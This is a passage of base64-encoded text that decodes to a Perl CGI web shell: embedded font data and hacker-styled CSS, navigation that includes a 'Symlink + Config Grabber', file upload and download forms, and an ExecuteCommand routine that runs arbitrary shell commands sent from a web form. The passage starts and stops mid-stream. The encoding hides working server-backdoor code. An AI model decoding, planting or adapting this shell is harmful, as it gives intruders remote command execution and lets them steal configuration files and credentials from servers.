MFZMalFuYkJzRkxZeTgzREtMdUNkZGxpTXdzM0FCa2FPa2VMVEZ2QzJPWnVXYSttblF0MEEzOXpwbjJYMzdncStucnM2VUM5MkIvZGx2NXA3UHUxbnd6MW50amRkN0JQUE8xTnRTV2ErOUpPTmpVa0RtNG5qMDIrVyt0cjNWOS93OTJOb2ZyUVJ0K2ZOTFlQcnR0VStNZW5OcjE4NW83MmtSUGR0VHU3RW0zM25laUloL2xNemJkb0wxUGEyN21SNXJRK043Zmo2endKcldYenRZQk5ZQlJOVFdpVkNIbU5KeGpCQjBOTEJneUlUVFdGbFplaTkrcFlJaUtHOFdBUHNmS3E3UHl0WWhkS0NjOXVJZHQ5RlI5emJudFp6Wkg1TThKRkczaE8zVXMvSTY4NnEvUHNIeUt2T3UxSlVGaXlZQVBhRFFoSUZtcEN5ejQybFEvK24wODNoUjRMMHYxWkNqb1dJcHk4VTR3aktYU1BYSmtMbmtYM0h5SVhQSU51Q2k0V0pOeWd3SW9GS2I4MG5RZFdhRzlVODhEM0ZQUEFSZHF6K3Q4ekQveUVGWmVOVnEybHFQckRwSU92MHUzNDZGVldUOTJDblpDNXlMeXI2UEx1cVE3SlJkeDFEdXhJTVJmOE9aVkxvU0tYb3JUVE9lYUMzYk55d1pYV3lYRkhKUVpodklwTnFlUnBFUTJ3YXp4cHJJYmpTdUpHV2lxcTZXRWxKK3lsSWhHS1VwSEFzdTBGUkdKdWJFWHRhekVUVEYzSnFZZUxac1V6eFphbUtSZzFoMEhiVktOeU9WTmNyOTJ6ZWhMMU02M2NLVzZTOXNMdzRaNTZzeWpyUzRvZHpPbld5QklGRUdndVNueFNObUsvK2lSdHM2cytlWHlCQjdYM2M4MlhmOXFVU1RjMnBqTk54WGZ5eXRoWTRlMVVXMXNxMGJxZS9YOVQ2OWVuRW0wM0tHdndHZTRjOXg3alpSWUJGZHZWdlBMaTRneFY0UnBVTmh6NHJMUy9jVXpOSmkvRGdJSGFFaUVtUEtHM09iVktmMk96MGc1eE1mYTNkbUttdVFwenlXVk1SWTJTUzRaaFp1Zk5KbGRma1U3VzJZdWJYQ04wTWc3ZDFyMmhQNUhCK1dpNmQzbDNmNStZT1dleGs3djhOOFNHRHV6d3I0L3RPZ2hmNlV5MERyV08xcC9aaHBNUkNRMjFqalNlMlZwL1M1Uzg0M0ZORkJJZXg4VEo3Slpvc1EvWW0vUTVJNGdaMTgzWFZkZzdYMWRobjlwVk9DZTR5cWluYzlYT3dxamw1M1FYZmc2Viszd2RocmwvS3VhVFo5TFcrcCttYlZ4d3VUM0ljb3NnbFgwY2lhalE1NUJJaTJ2bnB6Rlp6QThxTkNxWXRtTStHc3ZubzlGZnpDbTdhTEcxNFBiUUJub1cyelZRaWlwOERxbDdGTTA5TDYyclptSmJoZDRpdHIxN0xzVnpvYTJhVTNiUm5ITDVWRTVaSGN2NFlrc3BISzlTamxlSk16RXVOcStDMFh5OGdDeUFiZWNNczI4ZUQyN2VNVDgwSDdhbHZYVkJuaXBocmMvYlhUYzgxVjIzK245NWQxMU1XSDlzaDEwU1JCSDltRDY3Mmllb3NLbzkrMkg4RGtBYjNlcnptc3FLejJ1cVVudjJxNEFERTlqT1pCSlJoMTk5YUJPaURyOWo2cUZOWlpqQ3RxTjZtL0hRSnZ1VkQyMmEwYmUvK055bTJwMHJ1by91cUp2ZHVUKzg3dVowZXNPS3dqbmRzK1VGUThEWE5QclVyaXZiOS9mczY0NkZxeFQ3b2N4bEhjemxVbVlsOC9MYzJjUmQ5U3RTOGlLUTQyVkorbUQ1NE1WOFJKSFNpUEtZVjVqbzhaVExDZEliVjQ3SHhYeEtrZDVWZjRUNWx5TkJKUllTeDhmaWdHRncydVJsSzJnL2wvK0VYQ3kwVmo1V1ZzN09YVHNmSXpnNjk5d1lTT2FqZDdqWHRRem9qMFdJWjJnWElROUhPMlZ5eXJNUTVVb09PMVRsaldZN2JwRXhxZ3NMSDRkaXhzZ3diU1prTWRQQ2FrczU3VnRsQWk4ZjhVMDV0dHpsN0ZtcXMzR3ZrQm03R3BSVHhqRDRKSkJLbStSSDl2QTJSSG96OXRIb3NQcHFWdklpODZOdnVldkt5ZjNxbnByZTJzejVpNmVHQnFPTDliNllMZk9aYklEZFNscEloMEdqbHZDYlNKeGMvK3ZmbVZqdUphTzJkZjkzWitRYklvQndHNWtUVEM2RW5xRS9KY2N4eEoya0NBRTdkMlU0ektEbFZ3c2hqS0N0eHZqZ09pWG5hNkk1WHl5dkVHREFxNU1ZNlVhOGF6Wk4wb3hERXYzamtCWkdKZ2l5b1JMZTYyeTVVaGZOR1ppRkhJOFBpQVUyb0crTlNXRDRrUWQvdE5vMnpwZ1hKOUZrWklSWiszTnc3U2s1aEJsUEhKak9Jc3h1QnhkT1VkUlhIMWl6c2FudHMvN3d4dHIzMk1LWDNiR211SzlPZEVYNzR5MzNSVVA5M1UwYkdnSW5MQUV4RkloNlM4M2xZakFROTVuSWczK1hqcVpxeVUvNnhnOTJkZCsyNFRPRmNsTzVQYnVqSzhYN3gveWVqbTM5TjNVL2tOL1U5S2RiNnJLMzN0ZllPTHFwdnJaL2oyMzNvU1BLK2xYcWUzb1pubmFsSFpwZDRZT0d2VG9sT3d4WVgwNDcxQ3JsUHVOdUU5WXZDY3BxRmNTOFd5bWs5OVBESVdYcDBuSS9mT1MxQTVoSEhTTkprNVZEV0ZwZldYMzFJcUdGMXRZVmhVUDc1dHNKTWw4VjBmTlhyaDlDREpvbyt4N2dCUzE0QkpKV2xMalVWQnN2WGJHTlY0bEdhWGNvRTYxS3FiS1BnU2orbVdiM2xFRW56TTgxR3prZitHRStrRkhKVGx2NmpwY1o3ZUJ4YVRXVEt2cklXNVFHZXZRWkZXVllpSStMaVhabWtnMldHVzJ0NTdoT1A3OWF1ZmtDa1lTWi9SaVpXZDBXbWQvL0hIT0kvSXdiWkFlVjV6c3FUb0x5cUtPcDV6dWlVM0NJL1FYNTJlSEQ4SHVHL0V6RFhQWDNBdnhldzlDZnc3MFQzSGIyWmUwNThOVVdNeWhaMmhKa21mcXdIMlFnZHZSQ28yRmhxQkpubEE2QnlLM3BUbThKc2YvQkRZRndTMTNDMmxqYm4yMXIxNFJyUndjNlRQc01Ra1Vpb3Z0TXJMTnJCOXhMNURheEwybFBLL2V5aS9uUzZYc1padDlMMlQrSjl3SVRNTDFMMHNMcWlUampOdUt0WXh2K1IyVlhFOXJHRllUMzdWdXQxcElzVzdGK29raUtvOGp5NGdwcDBXNk5JMHRFamxxRUNOUUlJNFFqU2pEQk9ERnFxeFkzOWtHWWtJaFNTaWltdEFXMzlGQktEMFg0SUJrVFJBbUJVRW9nVUh3b0RaZ2NldWlodUFVZlNnK2xjVGQ5ODk3SzJzcEpTdy9MTGdOdlorYnRtNTE1UC9NTjNwZGNvOHFFT0E5TVhrbmZlck00Q0hvcCtoNy9IUXI5SDE2Vy8rVDFoWW5WTE5XUXhsZnp1SUdiZEIxRzVnb2NqT2RUR29Bd0FuYVlYNldiSnVTbjZMUURkaHRkSXoxclozVmlvRS9ia2owRis5VnRpMGdSbDlyQlVYWVdzYitYby8yRStVanhuY1ZRNU1KMDNKSE81UExwTXRvektPZUE4dkpMNlV1Q2tscTVuSGVzU2M1UUxDb1drMXBwcm5LTVFuVW9FeDIrNnVrd29yUmtEU0RQVklxa1JYV1FqblFJbW5VZy9kZm00VmNlZExYZE10UEI2MmM2OVBkb3RKOVFOZ2tMd3FPN0puMEk0UXIrazBnYWp3cHpDc2llZnN1US9aOFVrRi8vRFRlNVB6Z1hpZkh5TUpKYjBTUDVUNmcwdkJQSnY1VEk3MkRyU1dmc0xMSno5SkRBVGtTcHEyMjdmVlI2SDkwdC9WZnA4MjhIVExMZmkrUlNKdGtYTjUySmdsZ2tZaGFabUt2U0VPMzBIb1h0SmUraks5aUh0MGpmSnlpU0o3RkJxeEF6YmwxVHRORi9tWEdEa2NzZFg5L1lsd3RMdWV4eVFaWUx5OW5jVWtIbTMwMVY1eFE0SHBpdUZoV2xXS1UrS1B2MFozeWYrOWJJK1NweDJ3TVF6WGpDbXJhREpXNkV2SDRvb0txVWFoQ01kY1Jud2pWRGdhdGV4aUdzTFJMSnBwN2pVY3pQMlV3eW1ZRUxYU0loMi9SME1wbENwZTVUT1o3THhaOXhnVzNMM0FyL05mNk0rQkl2WjNJZmRxR0xsanRBRVhtUmpFS3JEeCt1OGhMNmFFYmYwcmN1a0xaNTBuYVB0ZzEzMjdaNGRVYzRhazVybkxRUURBQUFzeHNnVGNnN1VFai9hUWVWVUdsR2YwMnZRcjBTMG9kM0xUWXVDWWltQ1hvbW44d29uSERPMUlNQk56L2hISXhCeGh3VWw0aVFxSENBRWs1cDRLbGFKOW1wWmN1ajlta3k2WUpqeUtjdFVQMGxTZjIwVEFSNElkWDIyR2lpRmMwT0czOXhNb09tSXBNYU96TEJFS0d0WVd0WWRIdUN5RWNlVER1RzQvTEZkWjVmMzRqKytzM2NOVFVjVzU2NjNmQ2dUYjllNDNuMHhrbTlFL2k0UGx1TGpZMStjdm1ISDBQbzg0WTc3Z3NvM3NiZTkrNlJqV0hQcHpjYnZrVEFGM2MzdnJ3UjhINHdQUDdMTGxzemlmS1A4YTd3TzJjbE1mQXRWcW00UFRpc2FRWTBZZ3VyWFRoaktMNGxlVldXTkNmMjBCTEZibG5uYlpHaUpZcVFNV2RoV0FRRzF0b1lSUi9ZOFRLY1dvaU94eVNhL0FsSXBFNWFLSlBtMHpQSEZ5SHhDOFdBRENDWU1FUkloQ2RiSTdJVGU2Sm92YkdHd3FMRE9XU3JWUlpxTnFmRExxN3h2TUNYWHkwS0FvK0Y5NjllMVdmUnRqNjd0Rm0vZGs3ZlI3NnBhbjF6VWFwY3IwOGNIRXpVcjFja1pwOWdOQjNjSVpZamQwOUMwMktIREg4VTI2bTFzcHZoWTVPdXNBdWFIQmJBM2xLUSswdnJKWjdseGptTzFqeUFtZ0RzSzRhUXh0UXdMMDY2TkZmcTlWWm5RZlc3RlhtbGNualk1T1BadURJem84U3ovaWJVSnUwOGNId29pVGRyckN3cGFtcVpqS2FkUC85a0FkODV2TWkrVitycEFUNHcrRDZYSzVtNGt2QVlxUDBNdGFiTlB6SHF1NzF5bk4xZnU4SmE4TWw3c2Nud3NMZ2gzUGdiMTR0TFh3QUFBSGphWTJCa0FJSXpad3puclhrY3oyL3psVUdlQXlUQWNPNk02azBFL1c4SkN3UGJFaUNYZzRFSkpBb0FtNllOU0hqYVkyQmtZR0JiOHJjSVJESUFBUXNEQXlNREtuZ0JBRkZjQTdKNDJuV1RzVXZEUUJUR1gxb1JSK21hb1lNRUJ3Y1J3UkpFQWlJZGdoUUpSUnhLaHVJZ0xpVklFY2ZnNEJDa1pIRndGQkZjSEJ5S0ZQOE1OMmNSd2NsWnhPL2RmY1Y0YU9ESDkvSnlkKy9kZDVmYXUyd0pucGxmZUVkZ0RuRUxERUFBSXVSdW9LOWtDRkxrVmtBVEhPTDkzT2Jra3Q5UFFBek91RTRPRGl3NjN0TjYrNXlqK2dnUzBPRDRsRG9oK3Q0RFkrWlBtZDhFR1ZnSEY5U003SUErOERsdWxUSG1lN3F2RWZoZzNYbmtPdEJqVUxLbmhPVFVrclhMU3R4bG5GVDBtZnZXZVFYWUFJdnNMV2FmVjZoM3ozaWIzZzlaVi9mWnNiMmFNUVY5YjdQZjNOWlY3MDN1azM2cVIxK0lhNkRIZmtMNkhkbTg4ZStPNTdvQWx1aDk0eDlhWEhmaU1IWUlLdWZnTXFMMkhYenV2NlR2ZnhFNVp6Rmw0SkJWL0hkSnFZVkR6RGt4OXhuUmM3My9ML1ZFWlBaYVpLcTFOUkh2RnZnV2VZSjJvYWs1dStZUDVsOFEvaC9MRnRrRHUrUk5hK2xjZk1POThOcTZMdnNJNmc4bURpWDhCdUhxWHdaNDJtTmdZTkNCd3lxR0xZd3ptSXlZcmpFWE1NOWlQc0w4Z2NXSHBZL2xDTXNqVmhGV0Q5WjlyUC9ZQ3RpZXNkdXd2K05JNGxqQXFjWTVqZk1XbHhxWERWY2NWd25YSSs0eW5pU2VON3dPdkZONEwvQ3g4Ulh4cmVKN3hLL0VuOFRmSWNBaDRDVXdUK0NEWUlUZ0NTRW5vU0toYmNMSFJHeEVxa1MyaUx3VGxSTDFFNjBRblNhNlR2U2NXSURZR3JGLzRqSGkreVFDSkk1Sjhram1TVjZRNHBNS2t0b2o5VWZhVDNxTkRJK01pOHdHV1E1Wkg5bHRjcnZrZnNrWHlhOVFFRkV3VUppajhFUGhoNktiNGpZbEZhVTV5aHpLZXNxUFZGUlV6cW42cWVhb1RsSGRwRmFpTmtudGhicVplbzhHaDRhR1JwWEdNWTB2bWxhYVRacFhOTDlvVldqemFUL1JDZFAxMC9QUWR6SElNcHhrdE0yWXozaVM4UTBUT1pNc2t3ZW1hcVk1cHR2TWpNeFdtZXVaOTVpL3N2Q3l1R1daWXRsbXhXVVZZYlhDbXNHNnp2cVFqWlRORmxzNzJ6TjJjZllTOWhjY09oeURIQjg1K1RodGMxWnhQdUVpNFpMaHNzZlZ5bldMbTRYYkZMY1A3bjd1RHp6eVBEWjVHbmsyZUY3eTB2SmE0YTNoM2VmajVYUEFOOC8zbForUVh3d09tT1ZYNGRmbU44OXZtOThiZnlYL0NQOWRBVklCRlFFYkFnV0FVQzh3Q0FqUEJIa0VaUVF0Q2JvRkFHUWJscU1BQVFBQUFPa0FUUUFGQUFBQUFBQUNBQUVBQWdBV0FBQUJBQUhFQUFBQUFIamFuWks3U2dOQkZJYi8zY1JMVUlJUkNSWWlVNGlkbTQxRzBGU0NRU3pjUnZEU2JpN0dZQzZ5R1JIQndtZndDU3g5QXA5QndjcktKN0gybjltemlzRkVDVU1tMzV6em44dk9IQUE1dkNFRko1MEJjTTlmekE3eVBNWHNJb3RINFJSMjhDU2N4aW8raENldzZDd0pUMkxGS1FsUDRjNDVGWjdHc3ZNdW5DRW5zVE1vdVF2Q3MrUjk0VG5rM1Z2aEhMSnUwczg4N1EvQ3orU2tueGY0N2l0MjBjTWxiaENoaFNiT29hR3dEaDlGTGtWdmlDNFZYWHByNURadEI5VFU0WkVNRzN1RC9qNzNPaTFYNURvNUltdm1hL0QvQ0ZWcjE5d1Y5bXcrL1NPNlpuVkZadlVIMUlGVjkzQklSWk9XTnJ1SWhtalVnRXJoMkhiU1p4MmpVTXp1WVd0b2pjSDQvMFFuc1dzak93enRyZngrbjBadHZqNnk4UzNXMDdadWZKK2FGTm9iN1ZqbEJmMktHYzcrZUoyS1BXdnBQT0FwWlBiRVA5cHJwa0J6S3Nvb2NGM2I1ZEgrSGRPUkNJOTFlendWeG9vWi82VlBxS255RHBKSmlpY25rTytwMEZ1ejg3a3QwMXpHSmwvTzdQN1hmRzk4QW90T2xsd0FlTnB0MEVWc0ZIRVV4L0h2YTNlNzdkYmRLZTR5TTl1cDRMdHRCM2QzQ3JWRld0aXl1SWJpRWdnSk53aDJBWUpySU1BQkNHNUJBaHc0NCtFQVhHSGErWFBqSlMrZnZQL2g5MTcrUk5CU2Y5eDA1bi8xeVc2UkNJa2tFaGR1b3ZBUVRReGVZb2tqbmdRU1NTS1pGRkpKSTUwTU1za2lteHh5eVNPZlZoVFFtamEwcFIzdDZVQkhPdG1idXRDVmJuU25CejNwaFlhT2dZOUNUSW9vcG9SU2V0T0h2dlNqUHdNWWlKOEFaWlJUZ2NVZ0JqT0VvUXhqT0NNWXlTaEdNNGF4akdNOEU1aklKQ1l6aGFsTVl6b3ptTWtzWmxNcExvN1N4Q1p1c0orUGJHWTNPempBY1k2Sm0rMjhaeVA3SkVvODdKSm90bktiRHhMRFFVN3dpNS84NWdpbmVNQTlUak9IdWV5aGlrZFVjNStIUE9NeFQzaHEvMU1OTDNuT0M4NVF5dy8yOG9aWHZLYU9MM3hqRy9NSU1wK0ZMS0NlUXpTd21FV0VhQ1RNRXBheWpNOHNaeVVyV01VYVZuT1Z3NnhqTGV2WndGZStjNDJ6bk9NNmIza25Yb21WT0ltWEJFbVVKRW1XRkVtVk5FbVhETW5rUEJlNHpCWHVjSkZMM0dVTEp5V0xtOXlTYk1saHArUktudVI3d3ZWQlRkUEtIWFdsWDFPcU9XQW9mVXBUV2Rxc1lRY29kYVdoOUNrTGxhYXlTRm1zTEZIK3kvTTc2aXBYMTcwMXdkcHdxTHFxc3JIT2VUSXNSOU55VllSRERTMkRhWlUxYXdXY08yeU52dzZybVZRQUFIamFQY3c5RXNGQUhBWHdiRlkya2MrTkNTb3pNWFJiYWJRYVNaUEdxTEl6em1GR3AxRnlDZ2Y0UitVU2p1QXNQS3p0M3UvTm0zZG5yeE94czlOUXNHazd4aTY2cTRWcXB5UjFROFVXNGFnbkpOU3VkWWlYRlhHMUpsRldOLzUwMVJjZUlLNEdQY0E3R1BpZjJjTWdBUHloUVI4SXNoOFloZVkyUWh0S1YzVzgzb014R0kwc0V6QmVXYVpnc3JETXdIUnVLY0ZzWnBtRGNtdzVBUFBsbjVvSzlRYmlCa3FzQUFBQlVxWjFXZ0FBKSBmb3JtYXQoJ3dvZmYnKTsNCiAgICBmb250LXdlaWdodDogbm9ybWFsOw0KICAgIGZvbnQtc3R5bGU6IG5vcm1hbDsNCg0KfQ0KDQpib2R5IHsNCmZvbnQtZmFtaWx5OiAidWJ1bnR1X21vbm9yZWd1bGFyIjsNCmZvbnQtc2l6ZToxMnB4Ow0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCmJhY2tncm91bmQtYXR0YWNobWVudDogZml4ZWQ7DQpiYWNrZ3JvdW5kLXBvc2l0aW9uOiBjZW50ZXI7DQpiYWNrZ3JvdW5kLWNvbG9yOiMyZDJiMmI7DQpjb2xvcjpsaW1lOw0KYmFja2dyb3VuZC1pbWFnZTogdXJsKCdodHRwczovL2NvbjdleHQtc2VjdXJpdHkuY29tL2ltYWdlcy9lcm9tYW5nYS5wbmcnKTsNCn0NCiNuYXZ7cG9zaXRpb246Zml4ZWQ7ei1pbmRleDo5OTk7dG9wOjA7d2lkdGg6MTAwJTtsZWZ0OjcwJTsNCn0NCmEubmF2LWZva3VzIHtkaXNwbGF5OmJsb2NrOyB3aWR0aDphdXRvOyBoZWlnaHQ6YXV0bzsgYmFja2dyb3VuZDojMTkxOTE5OyBib3JkZXItdG9wOjBweDsgYm9yZGVyLWxlZnQ6IDFweCBzb2xpZCAjZmZmOyBib3JkZXItcmlnaHQ6MXB4IHNvbGlkICNmZmY7ICBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZmZmOyAgcGFkZGluZzo1cHggOHB4OyB0ZXh0LWFsaWduOmNlbnRlcjsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IGNvbG9yOnJlZDsgbGluZS1oZWlnaHQ6MjBweDsgb3ZlcmZsb3c6aGlkZGVuOyBmbG9hdDpsZWZ0Ow0KfQ0KYS5uYXYtZm9rdXM6aG92ZXIge2NvbG9yOiNGRkZGRkY7IGJhY2tncm91bmQ6IzE5MTkxOTsgYm9yZGVyLXRvcDowcHg7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2ZmZjsgYm9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjZmZmOyAgYm9yZGVyLWJvdHRvbToxcHggc29saWQgI2ZmZjsNCn0NCmlucHV0W3R5cGU9dGV4dF17DQoJYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IA0KCWNvbG9yOndoaXRlOw0KCW1hcmdpbjowIDEwcHg7DQoJZm9udC1mYW1pbHk6SG9tZW5hamU7DQoJZm9udC1zaXplOjEzcHg7DQoJYm9yZGVyOm5vbmU7DQp9DQppbnB1dFt0eXBlPXN1Ym1pdF0gew0KCWJhY2tncm91bmQ6IGJsYWNrOyANCgljb2xvcjp3aGl0ZTsNCgltYXJnaW46MCAxMHB4Ow0KCWZvbnQtZmFtaWx5OkhvbWVuYWplOw0KCWZvbnQtc2l6ZToxM3B4Ow0KCWJvcmRlcjpub25lOw0KDQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IjJkMmIyYiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxkaXYgaWQ9Im5hdiI+DQo8YSBjbGFzcz0ibmF2LWZva3VzIiBocmVmPSIkU2NyaXB0TG9jYXRpb24/Ij48Yj5Ib21lPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWhlbHAiPjxiPkhlbHA8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkIj48Yj5VcGxvYWQ8L2I+PC9hPg0KPGEgY2xhc3M9Im5hdi1mb2t1cyIgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQiPjxiPkRvd25sb2FkPC9iPjwvYT4NCjxhIGNsYXNzPSJuYXYtZm9rdXMiIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXN5bWNvbmZpZyI+PGI+U3ltbGluayArIENvbmZpZyBHcmFiYmVyPC9iPjwvYT48L2Rpdj4NCjxicj4NCjxmb250IGNvbG9yPSJsaW1lIiBzaXplPSIzIj4NCkVORA0KfQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCnN1YiBHZXRDb29raWVzDQp7DQpAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCnsNCigkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCiRDb29raWVzeyRpZH0gPSAkdmFsOw0KfQ0KfQ0KDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQogICAgcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSI/Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYyI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGNlbnRlcj48YnI+DQo8Zm9udCBjb2xvcj1saW1lPjxiPjxpPjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvaT48L2I+PC9mb250PjwvY2VudGVyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+PGJyPjxjZW50ZXI+PGZvbnQgY29sb3I9bGltZT48Yj48aT48Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+PC9pPjwvYj48L2ZvbnQ+DQo8L2NlbnRlcj4NCjwvY29kZT4NCkVORA0KfQ0KDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQo8Y29kZT4NCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KICAgaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KICAgIHsNCiAgICAgICAgIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KICAgICAgICAjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCiAgICAgICANCiAgICAgICAgJE9sZERpciA9ICRDdXJyZW50RGlyOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQogICAgICAgIGNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQogICAgICAgIHByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQogICAgfQ0KICAgIGVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KICAgIHsNCiAgICAgICAgJlByaW50UGFnZUhlYWRlcigiYyIpOw0KICAgICAgICAkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCiAgICAgICAgcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KICAgICAgICAkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQogICAgICAgIGlmKCEkV2luTlQpDQogICAgICAgIHsNCiAgICAgICAgICAgICRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQogICAgICAgICAgICBhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQogICAgICAgIH0NCiAgICAgICAgaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KICAgICAgICB7DQogICAgICAgICAgICAkfD0xOw0KICAgICAgICAgICAgJENvbW1hbmQgLj0gIiB8IjsNCiAgICAgICAgICAgIG9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KICAgICAgICAgICAgd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRfID1+IHMvKFxufFxyXG4pJC8vOw0KICAgICAgICAgICAgICAgIHByaW50ICIkX1xuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR8PTA7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50IGAkQ29tbWFuZGA7DQogICAg